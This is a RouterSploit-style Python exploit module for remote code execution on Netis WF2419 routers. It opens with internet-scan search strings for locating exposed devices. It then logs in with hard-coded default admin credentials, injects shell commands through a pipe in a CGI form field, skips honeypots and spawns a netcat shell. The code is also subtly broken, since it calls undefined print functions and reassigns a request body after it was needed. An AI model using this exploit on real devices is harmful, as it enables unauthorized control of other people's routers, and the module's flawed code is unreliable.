'''
Exploit description: # Exploit Title: Netis WF2419 2.2.36123 - Remote Code Execution
shodan search: Basic realm=\"WF2419\"
Censys search: services.http.response.headers.www_authenticate:"Basic realm=\"WF2419\""
Zoomeye search: Basic realm=\"WF2419\"
fofa search : Basic realm=\"WF2419\"
'''

# pylint: disable=import-error
import json
from routersploit.core.http.http_client import HTTPClient
from routersploit.core.exploit.option import OptIP, OptPort
from routersploit.core.exploit.utils import is_it_honeypot
from routersploit.core.exploit.printer import log
from routersploit.core.exploit.shell import shell


class Exploit(HTTPClient):
    __info__ = {'name': 'Netis_WF2419_RCE'}

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def __init__(self):
        self.headers_value = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': "Basic YWRtaW46YWRtaW4="
        }

    def execute(self, command: str) -> str:
        # Send Payload
        post_data = "mode_name=netcore_set&tools_type=2&tools_ip_url=|+" + command + "&tools_cmd=1&net_tools_set=1&wlan_idx_num=0"
        req_payload = self.http_request(
            method="POST", path="/cgi-bin-igd/netcore_set.cgi",
            data=post_data, headers=self.headers_value
        )
        if not req_payload:
            return ''
        try:
            json_data = json.loads(req_payload.text)
            if json_data[0] == "SUCCESS":
                # Get Command Result
                print_success('[+] Getting Command Output\n')
                req_result = self.http_request(
                    method='POST', path="/cgi-bin-igd/netcore_get.cgi",
                    data=post_data, headers=self.headers_value,
                )
                post_data = "mode_name=netcore_get&no=no"
                json_data = json.loads(req_result.text)
                results = json_data["tools_results"]
                return results.replace(';', '\n')
            return ''
        except:
            print_error("[!] You might need to login.")
        return ''

    def check(self) -> bool:
        response = self.http_request(
            method="GET", path="/cgi-bin-igd/netcore_set.cgi",
            headers=self.headers_value
        )
        if response and "SUCCESS" in response.text and not is_it_honeypot(response):
            return True
        return False

    def run(self):
        if self.check():
            print_success("Target seams %s:%d is vulnerable", self.target, self.port)
            shell(self, architecture='armle', binary="/usr/bin/nc", shell="/bin/bash")
        else:
            print_error("Exploit failed - target %s:%d seems to be not vulnerable", self.target, self.port)
